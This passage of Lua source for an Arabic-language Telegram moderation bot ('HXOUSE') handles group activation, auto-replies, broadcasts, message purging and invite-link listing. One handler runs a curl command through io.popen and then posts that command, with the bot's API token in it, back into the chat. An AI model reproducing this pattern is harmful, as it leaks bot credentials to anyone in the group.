}, hxouse333, nil)
end
openChat(msg.chat_id_,hxouse) 
end
getChannelFull(chattid, Faeder_re, nil)
end 
end
-----------------------------
if text:match("^غادر (-%d+)$")  and hxouse11(msg) then
if not hxousedx1:get(HXOUSE..'lock:add'..msg.chat_id_) then
local txt = { string.match(text, "^(غادر) (-%d+)$")}
if not is_sudo(msg) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ للمطورين فقط ', 1, 'md')
else 
local leavegp = function(extra, result)
if result.id_ then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙المجموعه ⌯» {" .. result.title_ .. "}\n⌯︙تمت المغادره منها بامر المطور ", 1, "md")
if hxousedx1:get(HXOUSE.."lang:gp:" .. result.id_) then
local text = [[
⌯︙بامر من المطور تم مغادره المجموعه
⌯︙بامر من المطور تم مغادره المجموعه
  ٴ… … … … … … … … … … …➖➖➖➖➖
⌯︙ مطور البوت  ]]..SUDOUSERNAME..[[
]]
hxousedx(result.id_, 0, 1, text, 1, 'html') 
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙المجموعه ⌯» {" .. result.title_ .. "}\n⌯︙تمت المغادره منها بامر المطور ", 1, "md")
end 
chat_leave(result.id_, bot_id)
hxousedx1:srem(HXOUSE.."bot:groups", result.id_)
else
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙لم تتم اضافتي فيها لاقوم بمغادرتها ", 1, "md")
end  end
getChat(txt[2], leavegp) 
end end end
--------------------------------HXOUSE TEAM--------------------------------------------------------------
if text == 'تفعيل البوت الخدمي' then 
local  hxouse = '⌯︙ تم تفعيل البوت الخدمي ' 
hxousedx( msg.chat_id_, msg.id_, 1, hxouse, 1, "md") 
hxousedx1:del(HXOUSE..'lock:bot:free'..bot_id) 
end 
if text == 'تعطيل البوت الخدمي' then 
hxouse = '⌯︙ تم تعطيل البوت الخدمي '
hxousedx( msg.chat_id_, msg.id_, 1, hxouse, 1, "md") 
hxousedx1:set(HXOUSE..'lock:bot:free'..bot_id,true) 
end
if text == 'تفعيل التنبيه' then 
if not is_sudo(msg) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ للمطورين فقط ', 1, 'md')
else 
local  hxouse = '⌯︙ تم تفعيل التنبيه على تغيير\n⌯︙ { صوره - اسم - معرف } الاعضاء\n⌯︙في كل مجموعات البوت' 
hxousedx( msg.chat_id_, msg.id_, 1, hxouse, 1, "md") 
hxousedx1:del(HXOUSE..'lock:bot:ttt'..bot_id) 
end 
end
if text == 'تعطيل التنبيه' then 
if not is_sudo(msg) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ للمطورين فقط ', 1, 'md')
else 
hxouse = '⌯︙ تم تعطيل التنبيه على تغيير\n⌯︙ { صوره - اسم - معرف } الاعضاء\n⌯︙في كل مجموعات البوت'
hxousedx( msg.chat_id_, msg.id_, 1, hxouse, 1, "md") 
hxousedx1:set(HXOUSE..'lock:bot:ttt'..bot_id,true) 
end
end
if text and text == "تفعيل تنبيه التغيرات" and hxouse11(msg) then
if hxousedx1:get(HXOUSE..'lock:bot:ttt'..bot_id) then 
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙التنبيه على تغيير\n⌯︙ { صوره - اسم - معرف } الاعضاء\n⌯︙معطل في كل الكروبات من قبل المطور  ', 1, 'md')
return false 
end
if not is_owner(msg.sender_user_id_, msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ لمدراء المجموعه فما فوق ', 1, 'md')
else 
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم تفعيل التنبيه على تغيير\n⌯︙ { صوره - اسم - معرف } الاعضاء\n⌯︙في هذه المجموعه  ', 1, 'md')
hxousedx1:del(HXOUSE.."lock:bot:ttt2:"..msg.chat_id_)
end
end
if text and text == "تعطيل تنبيه التغيرات" and hxouse11(msg) then 
if not is_owner(msg.sender_user_id_, msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ لمدراء المجموعه فما فوق ', 1, 'md')
else 
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم تعطيل التنبيه على تغيير\n⌯︙ { صوره - اسم - معرف } الاعضاء\n⌯︙في هذه المجموعه  ', 1, 'md')
hxousedx1:set(HXOUSE.."lock:bot:ttt2:"..msg.chat_id_,"ok")
end
end
if text == 'تفعيل اللعبه' and hxouse11(msg) then   
hxousedx(msg.chat_id_, msg.id_, 1,[[*
⌯︙ اهلا بك في قائمه الالعاب ↓↓
ٴ… … … … … … … … … … …
⌯︙ الالعاب المتوفره بالبوت ↓↓
ٴ… … … … … … … … … … …
⌯︙ ارسل امر { ترتيب } لبدء لعبه 
⌯︙ ارسل امر { سمايلات } لبدء لعبه 
⌯︙ ارسل امر { حزوره } لبدء لعبه 
⌯︙ ارسل امر { المعاني } لبدء لعبه 
⌯︙ ارسل امر { العكس } لبدء لعبه 
⌯︙ ارسل امر { المحيبس } لبدء لعبه 
⌯︙ ارسل امر { امثله } لبدء لعبه 
⌯︙ ارسل امر { المختلف } لبدء لعبه 
ٴ… … … … … … … … … … …
⌯︙ قناة السورس *[@HXOUSEiq] 
]], 1, 'md')
hxousedx1:set(HXOUSE..'bot:lock_geam'..msg.chat_id_,true)  
end
if text == 'تعطيل اللعبه' and hxouse11(msg) then  
hxouse = '*⌯︙ تم تعطيل اللعبه ༯*'  
hxousedx(msg.chat_id_, msg.id_, 1,hxouse, 1, 'md')
hxousedx1:del(HXOUSE..'bot:lock_geam'..msg.chat_id_) 
end
if text == 'تفعيل جلب الصوره' and is_owner(msg.sender_user_id_, msg.chat_id_) and hxouse11(msg) then   
if hxousedx1:get(HXOUSE..'lock:get:photo'..msg.chat_id_) then
hxouse = '*⌯︙ تم تفعيل جلب الصوره الشخصيه ༯*' 
hxousedx( msg.chat_id_, msg.id_, 1, hxouse, 1, "md") 
hxousedx1:del(HXOUSE..'lock:get:photo'..msg.chat_id_) 
else
hxouse = '*⌯︙ جلب الصوره الشخصيه مفعل مسبقا ༯*' 
hxousedx( msg.chat_id_, msg.id_, 1, hxouse, 1, "md") 
end
end
if text == 'تعطيل جلب الصوره' and is_owner(msg.sender_user_id_, msg.chat_id_) and hxouse11(msg) then   
if not hxousedx1:get(HXOUSE..'lock:get:photo'..msg.chat_id_) then
hxouse = '*⌯︙ تم تعطيل جلب الصوره الشخصيه ༯*'  
hxousedx( msg.chat_id_, msg.id_, 1, hxouse, 1, "md") 
hxousedx1:set(HXOUSE..'lock:get:photo'..msg.chat_id_,true) 
else
hxouse = '*⌯︙ جلب الصوره الشخصيه معطل مسبقا ༯*'  
hxousedx( msg.chat_id_, msg.id_, 1, hxouse, 1, "md") 
end
end
if text and text == "تفعيل الرابط" and hxouse11(msg) then 
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙تم تفعيل الرابط ', 1, 'md')
hxousedx1:del(HXOUSE.."bot:tt:link:"..msg.chat_id_)
end
if text and text == "تعطيل الرابط" and hxouse11(msg) then 
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙تم تعطيل الرابط ', 1, 'md')
hxousedx1:set(HXOUSE.."bot:tt:link:"..msg.chat_id_,"ok")
end
if text:match('^تفعيل$') and hxouse11(msg) then
function adding(extra,result,success)
local txt = {string.match(text, "^(تفعيل)$")}
local function promote_admin(extra, result, success)
local admins = result.members_
for i=0 , #admins do
hxousedx1:sadd(HXOUSE..'bot:momod:'..msg.chat_id_,admins[i].user_id_)
if result.members_[i].status_.ID == "ChatMemberStatusCreator" then
owner_id = admins[i].user_id_
hxousedx1:sadd(HXOUSE.."bot:monsh:"..msg.chat_id_,owner_id)
end
end
end
getChannelMembers(msg.chat_id_, 0, 'Administrators', 200, promote_admin)
if hxousedx1:get(HXOUSE.."bot:enable:"..msg.chat_id_) then
if not hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم تفعيل المجموعه سابقا ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Group Actually added ', 1, 'md')
end
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Group has been added ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ عزيزي المطور \n༯  تم تفعيل المجموعه \n⌯︙ تم ترفع منشئ المجموعه \n⌯︙ تم رفع ادمنيه المجموعه ', 1, 'md')
end
openChat(msg.chat_id_,hxouse)
hxousedx1:sadd("hxouse:addg"..bot_id, msg.chat_id_)
function hxouse(f1,f2)
function hxouse333(t1,t2)
if t2.invite_link_ == false then 
local getlink = 'https://api.telegram.org/bot'..tokenbot..'/exportChatInviteLink?chat_id='..msg.chat_id_
local req = https.request(getlink)
local link = json:decode(req)
if link.ok == true then 
  t2.invite_link_ = link.result
end
end
hxousedx1:set(HXOUSE.."bot:group:link"..msg.chat_id_,(t2.invite_link_ or "Error")) 
hxousedx(tostring((hxousedx1:get(HXOUSE.."bot:leader:gr") or bot_owner)), 0, 1, "⌯︙ تم تفعيل مجموعه جديده  \n⌯︙ ايدي الضافني ~ {"..msg.sender_user_id_.."}\n⌯︙ معرف الضافني ~ @"..(result.username_ or "لا يوجد").."\n⌯︙ معلومات المجموعه  \n\n⌯︙ ايدي المجموعه ~ {"..msg.chat_id_.."}\n⌯︙ اسم المجموعه  {"..f2.title_.."}\n⌯︙ رابط المجموعه \n⌯︙  {"..(t2.invite_link_ or "Error").."}" , 1, 'html') 
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
}, hxouse333, nil)
end
openChat(msg.chat_id_,hxouse) 
hxousedx1:set(HXOUSE.."bot:enable:"..msg.chat_id_,true)
hxousedx1:setex(HXOUSE.."bot:charge:"..msg.chat_id_,86400,true)
hxousedx1:sadd("hxouse:addg"..bot_id, msg.chat_id_)
local send_to_bot_owner = function(extra, result)
local v = tonumber(bot_owner)             
end
end
end
getUser(msg.sender_user_id_,adding)
end
------
if text:match('^تعطيل$') and is_admin(msg.sender_user_id_, msg.chat_id_) and hxouse11(msg) then
local txt = {string.match(text, "^(تعطيل)$")}
if not hxousedx1:get(HXOUSE.."bot:enable:"..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Group Actually Rem ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ المجموعه معطله سابقا ', 1, 'md')
end
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Group has been Rem ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم تعطيل المجموعه ', 1, 'md')
end
hxousedx1:del(HXOUSE.."bot:charge:"..msg.chat_id_)
hxousedx1:del(HXOUSE.."bot:enable:"..msg.chat_id_)
hxousedx1:srem("hxouse:addg"..bot_id, msg.chat_id_)
local v = tonumber(bot_owner)          
end
end
if text:match('^[Rr]em(-%d+)$') and is_admin(msg.sender_user_id_, msg.chat_id_) then
local gp = {string.match(text, "^([Rr]em)(-%d+)$")}
hxousedx1:del(HXOUSE.."bot:charge:"..gp[2])
local v = tonumber(bot_owner)       
end
if text:match("^تفعيل كل الكروبات$") and hxouse11(msg) then
local gps = hxousedx1:smembers(HXOUSE.."bot:groups") or 0
local gps2 = hxousedx1:smembers("hxouse:addg"..bot_id) or 0
for i=1,#gps do
hxousedx1:sadd("hxouse:addg"..bot_id, gps[i])
hxousedx1:set(HXOUSE.."bot:enable:"..gps[i],true)
hxousedx1:set( HXOUSE.."bot:charge:"..gps[i],true)
end
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم تفعيل المجموعات *{'..(#gps - #gps2)..'}*', 1, 'md')
end   
if text:match("^تعطيل كل الكروبات$") and hxouse11(msg) then
local gps = hxousedx1:smembers(HXOUSE.."bot:groups") or 0
local gps2 = hxousedx1:smembers("hxouse:addg"..bot_id) or 0
for i=1,#gps do
hxousedx1:del("hxouse:addg"..bot_id, gps[i])
hxousedx1:del(HXOUSE.."bot:enable:"..gps[i],true)
hxousedx1:del( HXOUSE.."bot:charge:"..gps[i],true)
end
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم تعطيل *{'..(#gps - #gps2)..'} مجموعه*', 1, 'md')
end   

if text:match("^الدعم$") or text:match("^المطور$") and hxouse11(msg) then
function adding(extra,result,success)
function hxouse(f1,f2)
function hxouse333(t1,t2)
if t2.invite_link_ == false then 
local getlink = 'https://api.telegram.org/bot'..tokenbot..'/exportChatInviteLink?chat_id='..msg.chat_id_
local req = https.request(getlink)
local link = json:decode(req)
if link.ok == true then 
  t2.invite_link_ = link.result
end
end
hxousedx1:set(HXOUSE.."bot:group:link"..msg.chat_id_,(t2.invite_link_ or "Error")) 
hxousedx(tostring((hxousedx1:get(HXOUSE.."bot:leader:gr") or bot_owner)), 0, 1, "⌯︙ هناك من بحاجه للمساعده  \n⌯︙ ايدي الشخص ~ {"..msg.sender_user_id_.."}\n⌯︙ معرف الشخص ~ @"..(result.username_ or "لا يوجد").."\n⌯︙ معلومات المجموعه  \n\n⌯︙ ايدي المجموعه ~ {"..msg.chat_id_.."}\n⌯︙ اسم المجموعه  {"..f2.title_.."}\n⌯︙ رابط المجموعه \n⌯︙  {"..(t2.invite_link_ or "Error").."}" , 1, 'html') 
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
}, hxouse333, nil)
end
openChat(msg.chat_id_,hxouse) 
end
getUser(msg.sender_user_id_,adding)
end
--------------------------------------------
if text == 'جلب نسخه الملف' then
if not is_leader(msg) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ للمطور الاساسي فقط ', 1, 'md')
else
if not hxousedx1:get(HXOUSE..'lock:add'..msg.chat_id_) then
sendDocument(bot_owner, 0, 0, 1, nil, './HXOUSE.lua', dl_cb, nil)
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ عزيزي المطور تم ارسال نسخه الملف الى خاصك مع البوت ', 1, 'md')
end end end
-----------------------
if text == 'روابط الكروبات' or text == 'روابط المجموعات' then
if not is_leader(msg) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ للمطور الاساسي فقط ', 1, 'md')
else
local groups = function(extra, result) 
local num = (hxousedx1:scard(HXOUSE.."bot:groups"))
local list = hxousedx1:smembers(HXOUSE.."bot:groups")
local text = "~ Groups_Bots_In_the_Bot_Of_Source_Faeder ~ @HXOUSEiq\n\n"
for k,v in pairs(list) do
local GroupsMonsh = hxousedx1:scard(HXOUSE.."bot:monsh:"..v) or 0
local GroupsOwner = hxousedx1:scard(HXOUSE.."bot:owners:"..v) or 0
local GroupsMod = hxousedx1:scard(HXOUSE.."bot:momod:"..v) or 0
local Groupslink = hxousedx1:get(HXOUSE.."bot:group:link" ..v)
if result.first_name_ then
if #result.first_name_ < 35 then
else
for hxouse222 in string.gmatch(result.first_name_, "[^%s]+") do
result.first_name_ = hxouse222
break
end end end
text = text..k.."⌯︙ Group ID  : [ "..v.." ]\n⌯︙ Group Link : [ "..(Groupslink or "Not Found").." ]\n⌯︙ Group Monsh  : [ "..GroupsMonsh.." ]\n⌯︙ Group Owners  : [ "..GroupsOwner.." ]\n🦿┇ Group Momods : [ "..GroupsMod.." ] \nٴ… … … … … … … … … … …➖➖➖\n"
end
local file = io.open('Groups_Bot.txt', 'w')
file:write(text)
file:close()
local dxx = 'https://api.telegram.org/bot' .. tokenbot .. '/sendDocument'
local dxxx = 'curl "' .. dxx .. '" -F "chat_id=' .. msg.chat_id_ .. '" -F "document=@' .. 'Groups_Bot.txt' .. '"'
io.popen(dxxx)
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ عزيزي ⌯» *'..result.first_name_..'*\n⌯︙ جاري ارسال نسخه للمجموعات \n⌯︙ تحتوي على *('..num..')* مجموعه\n‏ٴ… … … … … … … … … … …➖➖➖➖➖\n', 1, 'md')
sleep(1.5)
hxousedx(msg.chat_id_, msg.id_, 1, dxxx, 1, 'md')
end
getUser(msg.sender_user_id_, groups)
end
end
------------------------------------HXOUSE TEAM----------------------------------------------------------
if text and text:match("^نشر بالخاص (.*)") and is_leader(msg) then
if not hxousedx1:get(HXOUSE..'lock:add'..msg.chat_id_) then
local pm =  text:match("^نشر بالخاص (.*)")
local s2a = "⌯︙ تم ارسال رسالتك الى \n⌯︙ (* GP *) شخص في خاص البوت \n‏"
local gp = tonumber(hxousedx1:scard(HXOUSE.."bot:userss"))
gps = hxousedx1:smembers(HXOUSE.."bot:userss")
text = s2a:gsub('GP',gp)
for k,v in pairs(gps) do
hxousedx(v, 0, 1,pm, 1, 'md')
end
hxousedx(msg.chat_id_, msg.id_, 1,text, 1, 'md')
end 
end
-------------hxouse     
text = msg.content_.text_
if msg.content_.text_ == 'مسح رد' and  is_owner(msg.sender_user_id_, msg.chat_id_) and hxouse11(msg) then
hxousedx1:set(HXOUSE..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'','del_repgp1')
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ حسننا ارسل الكلمه التريد مسحها 📬" ,  1, "md")
return false
end
if msg.content_.text_ then
local content_text = hxousedx1:get(HXOUSE..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
if content_text == 'del_repgp1' then
hxousedx(msg.chat_id_, msg.id_, 1,'⌯︙ الكلمه *('..msg.content_.text_..')*\n تم مسحها ༯',  1, "md")
hxousedx1:del(HXOUSE..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
hxousedx1:del(HXOUSE..'gif_repgp'..msg.content_.text_..''..msg.chat_id_..'')
hxousedx1:del(HXOUSE..'voice_repgp'..msg.content_.text_..''..msg.chat_id_..'')
hxousedx1:del(HXOUSE..'stecker_repgp'..msg.content_.text_..''..msg.chat_id_..'')
hxousedx1:del(HXOUSE..'video_repgp'..msg.content_.text_..''..msg.chat_id_..'')
hxousedx1:del(HXOUSE..'text_repgp'..msg.content_.text_..''..msg.chat_id_..'')
hxousedx1:del(HXOUSE..'rep_owner'..msg.content_.text_..''..msg.chat_id_..'')
return false
end
end
--------------------------------------------------------------------------
if msg.content_.text_ == 'اضف رد' and is_owner(msg.sender_user_id_, msg.chat_id_)  and hxouse11(msg) then
hxousedx1:set(HXOUSE..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'','set_repgp')
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ حسننا ارسل لي الكلمه الان 📬" ,  1, "md")
return false    end
if msg.content_.text_ then
local content_hxouse2 = hxousedx1:get(HXOUSE..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
if content_hxouse2 == 'set_repgp' then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ حسننا ارسل لي الرد \n⌯︙ يمكنك اضافه { نص ، بصمه ، متحركه ، ملصق }" ,  1, "md")
hxousedx1:set(HXOUSE..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'','save_repgp')
hxousedx1:set(HXOUSE..'addreplaygp:'..msg.sender_user_id_..''..msg.chat_id_..'',msg.content_.text_)
hxousedx1:sadd(HXOUSE..'rep_owner'..msg.chat_id_..'',msg.content_.text_)
return false
end
end
 text = msg.content_.text_
if msg.content_.text_ == 'مسح رد للكل' and hxouse11(msg) then
hxousedx1:set(HXOUSE.."add:repallt"..msg.sender_user_id_,'del_rep1')
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ حسننا ارسل الكلمه التريد مسحها 📬" ,  1, "md")
return false
end
if msg.content_.text_ then
local content_text = hxousedx1:get(HXOUSE.."add:repallt"..msg.sender_user_id_)
if content_text == 'del_rep1' then
hxousedx(msg.chat_id_, msg.id_, 1,'⌯︙ الكلمه *('..msg.content_.text_..')*\n تم مسحها ༯',  1, "md")
hxousedx1:del(HXOUSE.."add:repallt"..msg.sender_user_id_)
hxousedx1:del(HXOUSE.."gif_repall"..msg.content_.text_)
hxousedx1:del(HXOUSE.."voice_repall"..msg.content_.text_)
hxousedx1:del(HXOUSE.."stecker_repall"..msg.content_.text_)
hxousedx1:del(HXOUSE.."video_repall"..msg.content_.text_)
hxousedx1:del(HXOUSE.."text_repall"..msg.content_.text_)
hxousedx1:del(HXOUSE.."rep_sudo",msg.content_.text_)
return false
end
end
--------------------------------------------------------------------------
if msg.content_.text_ == 'اضف رد للكل' and is_sudo(msg) then
hxousedx1:set(HXOUSE.."add:repallt"..msg.sender_user_id_,'set_rep')
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ حسننا ارسل لي الكلمه الان 📬" ,  1, "md")
return false    end
if msg.content_.text_ then
local content_hxouse2 = hxousedx1:get(HXOUSE.."add:repallt"..msg.sender_user_id_)
if content_hxouse2 == 'set_rep' then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ ارسل الرد \n⌯︙ يمكنك اضافه {نص ، بصمه ، متحركه ، ملصق}" ,  1, "md")
hxousedx1:set(HXOUSE.."add:repallt"..msg.sender_user_id_,'save_rep')
hxousedx1:set(HXOUSE.."addreply2:"..msg.sender_user_id_, msg.content_.text_)
hxousedx1:sadd(HXOUSE.."rep_sudo",msg.content_.text_)
return false 
end    end
-------------------------------------------------------------------------
if  msg.content_.text_ == 'الردود' and is_owner(msg.sender_user_id_, msg.chat_id_) and hxouse11(msg) then
local redod = hxousedx1:smembers(HXOUSE..'rep_owner'..msg.chat_id_..'')
if #redod == 0 then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ لا توجد ردود مضافه 🏷" ,  1, "md")
else
msg_rep = '⌯︙ ردود المجموعه \n'
for k,v in pairs(redod) do
msg_rep = msg_rep ..k..' ~ *{ '..v..' }* \n' 
end
hxousedx(msg.chat_id_, msg.id_, 1, msg_rep,1, 'md')
end
return false
end
-------------------------------------------------------------------------------
if msg.content_.text_ == 'مسح الردود' and is_owner(msg.sender_user_id_, msg.chat_id_) and hxouse11(msg) then
local redod = hxousedx1:smembers(HXOUSE..'rep_owner'..msg.chat_id_..'')
if #redod == 0 then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ لا توجد ردود مضافه 🏷" ,  1, "md")
else
for k,v in pairs(redod) do
hxousedx1:del(HXOUSE..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
hxousedx1:del(HXOUSE..'gif_repgp'..v..msg.chat_id_)
hxousedx1:del(HXOUSE..'voice_repgp'..v..msg.chat_id_)
hxousedx1:del(HXOUSE..'stecker_repgp'..v..msg.chat_id_)
hxousedx1:del(HXOUSE..'video_repgp'..v..msg.chat_id_)
hxousedx1:del(HXOUSE..'text_repgp'..v..msg.chat_id_)
hxousedx1:del(HXOUSE..'rep_owner'..msg.chat_id_..'',msg.content_.text_)
end
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ تم حذف جميع الردود ༯" ,  1, "md")
return false
end
end
----------------------------------------------------------------------------
if  msg.content_.text_ == "ردود المطور" and is_sudo(msg) then
local redod = hxousedx1:smembers(HXOUSE.."rep_sudo")
if #redod == 0 then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ لا توجد ردود مضافه 🏷" ,  1, "md")
else
local i = 1
msg_rep = '⌯︙ ردود المطور \n'
for k,v in pairs(redod) do
msg_rep = msg_rep ..k.." ~ *{ "..v.." }* \n"
end
hxousedx(msg.chat_id_, msg.id_, 1, msg_rep,1, "md")
end
return false
end
-------------------------------------------------------------------------------
if msg.content_.text_ == "مسح ردود المطور" and is_sudo(msg) then
local redod = hxousedx1:smembers(HXOUSE.."rep_sudo")
if #redod == 0 then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ لا توجد ردود مضافه 🏷" ,  1, "md")
else
for k,v in pairs(redod) do
hxousedx1:del(HXOUSE.."add:repallt"..v)
hxousedx1:del(HXOUSE.."gif_repall"..v)
hxousedx1:del(HXOUSE.."voice_repall"..v)
hxousedx1:del(HXOUSE.."stecker_repall"..v)
hxousedx1:del(HXOUSE.."video_repall"..v)
hxousedx1:del(HXOUSE.."text_repall"..v)
hxousedx1:del(HXOUSE.."rep_sudo",msg.content_.text_)
end
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ تم حذف جميع ردود المطور ༯" ,  1, "md")
return false
end
end 
----------------------------------------------hxouse -----------------------------------------------
if text:match("^تغيير اسم البوت$") or text:match("^وضع اسم البوت$") then
if not is_leader(msg) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ للمطور الاساسي فقط ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ ارسل لي اسم البوت الان ', 1, 'html')
hxousedx1:set('hxouse:'..bot_id..'namebot'..msg.sender_user_id_..'', 'msg')
return false 
end
end
if text and text == 'مسح اسم البوت' then
if not is_leader(msg) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ للمطور الاساسي فقط ', 1, 'md')
else
hxousedx1:del('hxouse:'..bot_id..'name_bot')
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم حذف الاسم ', 1, 'html')
end end 
----------------------------------------------HXOUSE TEAM-------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match('^مسح (%d+)$') and hxouse11(msg) then
local matches = {string.match(text, "^(مسح) (%d+)$")}
if msg.chat_id_:match("^-100") then
if tonumber(matches[2]) > 100 or tonumber(matches[2]) < 1 then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
pm = '⌯︙ Please use a number greater than 1 and less than 100 '
else
pm = '⌯︙ اختر رقم اكبر من 1 واقل من 100 🌟'
end
send(msg.chat_id_,0, 1, pm, 1, 'html')
else
tdcli_function ({
ID = "GetChatHistory",
chat_id_ = msg.chat_id_,
from_message_id_ = 0,
offset_ = 0,
limit_ = tonumber(matches[2])
}, delmsg, nil)
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
pm ='⌯︙ *'..matches[2]..' recent message removed* '
else
pm ='⌯︙ '..matches[2]..' من الرسائل تم مسحها ༯'
end
hxousedx(msg.chat_id_,0, 1, pm, 1, 'html')
end
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
pm ='⌯︙ This is not possible in the conventional group '
else
pm ='⌯︙ هناك خطا '
end
hxousedx(msg.chat_id_, msg.id_, 1, pm, 1, 'html')
end
end
if text:match('^[Cc]lean (%d+)$') then
local matches = {string.match(text, "^([Cc]lean) (%d+)$")}
if msg.chat_id_:match("^-100") then
if tonumber(matches[2]) > 100 or tonumber(matches[2]) < 1 then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
pm = '⌯︙ Please use a number greater than 1 and less than 100 '
else
pm = '⌯︙ اختر رقم اكبر من 1 واقل من 100 ༯'
end
send(msg.chat_id_,0, 1, pm, 1, 'html')
else
tdcli_function ({
ID = "GetChatHistory",
chat_id_ = msg.chat_id_,
from_message_id_ = 0,
offset_ = 0,
limit_ = tonumber(matches[2])
}, delmsg, nil)
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
pm ='⌯︙ *'..matches[2]..' recent message removed* '
else
pm ='⌯︙ '..matches[2]..' من الرسائل تم مسحها ༯'
end
hxousedx(msg.chat_id_,0, 1, pm, 1, 'html')
end
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
pm ='⌯︙ This is not possible in the conventional group '
else
pm ='⌯︙ هناك خطا '
end
hxousedx(msg.chat_id_, msg.id_, 1, pm, 1, 'html')
end
end
end
--------------------------------HXOUSE TEAM--------------------------------------------------------------
if is_leader(msg) and text:match("^استعاده الاوامر$") then
hxousedx1:del(HXOUSE..'bot:help', text)
hxousedx1:del(HXOUSE..'bot:help1', text)
hxousedx1:del(HXOUSE..'bot:help2', text)
hxousedx1:del(HXOUSE..'bot:help3', text) 
hxousedx1:del(HXOUSE..'bot:help4', text)
hxousedx1:del(HXOUSE..'bot:help5', text) 
hxousedx1:del(HXOUSE..'bot:help6', text) 
hxousedx1:del(HXOUSE..'bot:help7', text) 
hxousedx1:del(HXOUSE..'bot:help8', text) 
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ تم استعاده الكلايش الاصليه ༯" ,  1, "md") 
end
if is_leader(msg) and text:match("^تعيين الاوامر$") then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ ارسل لي الكليشه الان " ,  1, "md")
hxousedx1:set(HXOUSE..'bot:help0'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local hxouse =  hxousedx1:get(HXOUSE..'bot:help0'..msg.sender_user_id_..'')
if hxouse == 'msg' then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ تم حفظ الكليشه الجديده " ,  1, "md")
hxousedx1:set(HXOUSE..'bot:help0'..msg.sender_user_id_..'', 'no')
hxousedx1:set(HXOUSE..'bot:help', text)
hxousedx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text:match("^الاوامر$") then
local help = hxousedx1:get(HXOUSE..'bot:help')
local text =  [[
⌯︙ اهلا بك في سورس هـكسوس  √
⌯︙ اوامر البوت 🌟 ↓↓
ٴ… … … … … … … … … … …
⌯︙ ارسل (م1) لعرض اوامر الحماية
⌯︙ ارسل (م2) لعرض اوامر المشرفين
⌯︙ ارسل (م3) لعرض اوامر الخدمة
⌯︙ ارسل (م4) لعرض اوامر الوضع
⌯︙ ارسل (م5) لعرض اوامر الرفع والتنزيل
⌯︙ ارسل (م6) لعرض اوامر التفعيلات
⌯︙ ارسل (م7) لعرض اوامر مسح القوائم
⌯︙ ارسل (م8) لعرض اوامر المطورين
